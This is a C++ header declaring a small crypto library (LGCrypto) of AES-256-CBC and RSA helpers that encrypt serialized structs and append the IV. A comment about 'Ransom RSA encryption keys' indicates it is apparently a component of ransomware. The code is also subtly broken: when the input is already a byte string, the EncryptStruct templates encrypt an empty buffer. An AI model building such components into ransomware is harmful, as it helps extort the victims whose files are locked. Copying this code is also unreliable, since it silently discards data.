#pragma once

#include "NetworkTypes.h"
#include "Serialization.h"

constexpr int AES_256_CBC_IV_SIZE  = 16;
constexpr int AES_256_KEY_SIZE     = 32;
constexpr int RSA_2048_DIGEST_BITS = 256; 

struct RSAKeys {
    RSA* pub;
    RSA* priv;
};

namespace LGCrypto {
    inline bool   GoodDecrypt(BYTESTRING& d) { return ( d.size() != 0 ); }

    /*
        AES related operations.
        
        Note: All AES related operations use
        a 256 bit key and the CBC algorithm
    */
    BYTESTRING    GenerateAESIV();
    BYTESTRING    Generate256AESKey();
    BYTESTRING    AESEncrypt(BYTESTRING data, BYTESTRING key, BYTESTRING iv);
    BYTESTRING    AESDecrypt(BYTESTRING data, BYTESTRING key, BYTESTRING iv);
    
    template <typename _Struct>
    BYTESTRING EncryptStruct(_Struct data, BYTESTRING aes, BYTESTRING iv) {
        BYTESTRING serialized;

        if constexpr ( !std::is_same<BYTESTRING, _Struct>::value )
            // not the same so convert data to BYTESTRING
            serialized = Serialization::SerializeStruct(data);

        // add the iv
        BYTESTRING encrypted = AESEncrypt(serialized, aes, iv);
        encrypted.insert(encrypted.end(), iv.begin(), iv.end());

        return encrypted;
    }

    template <typename _Struct>
    _Struct DecryptToStruct(BYTESTRING input, BYTESTRING aes) {
        BYTESTRING extractedIV(input.end() - AES_256_CBC_IV_SIZE, input.end());
        BYTESTRING extractedEncrypted(input.begin(), input.end() - AES_256_CBC_IV_SIZE); // received without iv
        BYTESTRING decrypted = LGCrypto::AESDecrypt(extractedEncrypted, aes, extractedIV);

        if ( !LGCrypto::GoodDecrypt(decrypted) )
            return {};

        return Serialization::DeserializeToStruct<_Struct>(decrypted);
    }

    /*
        RSA Operations.

        Unlike AES operations, RSA is not limited to one size.
        Encryption and decryption works for all sizes.

        Ransom RSA encryption keys MUST be 2048 bits in size.
    */
    RSAKeys       GenerateRSAPair(int bits);
    BYTESTRING    RSADecrypt(BYTESTRING data, RSA* key, BOOL isPrivateKey);
    BYTESTRING    RSAEncrypt(BYTESTRING data, RSA* key, BOOL isPrivateKey);
    RSA*          RSAKeyFromString(std::string& s);
    std::string   RSAKeyToString(RSA* key, BOOL isPrivateKey);
    DER           RSAKeyToDer(RSA* key, bool privateKey);

    template <typename _Struct>
    BYTESTRING EncryptStruct(_Struct data, RSA* key, BOOL isPrivateKey) {
        BYTESTRING serialized;

        if constexpr ( !std::is_same<BYTESTRING, _Struct>::value )
            // not the same so convert data to BYTESTRING
            serialized = Serialization::SerializeStruct(data);

        return RSAEncrypt(serialized, key, isPrivateKey);
    }

};
